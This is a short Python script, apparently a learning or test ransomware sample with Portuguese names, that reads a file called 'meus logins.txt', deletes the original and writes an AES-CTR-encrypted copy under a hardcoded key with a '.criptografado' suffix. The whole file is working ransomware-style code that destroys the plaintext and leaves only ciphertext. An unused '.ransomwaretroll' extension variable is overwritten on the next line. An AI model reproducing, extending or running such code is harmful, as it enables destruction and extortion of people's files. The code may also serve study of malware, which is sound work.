import os
import pyaes

file_name = 'meus logins.txt'
file = open(file_name, 'rb')
file_data = file.read()
file.close()

os.remove(file_name)

key = b"testeransomwares"
aes = pyaes.AESModeOfOperationCTR(key)

crypto_data = aes.encrypt(file_data)

new_file = file_name + ".ransomwaretroll"
new_file = open(f'meus logins.txt.criptografado', 'wb')
new_file.write(crypto_data)
new_file.close()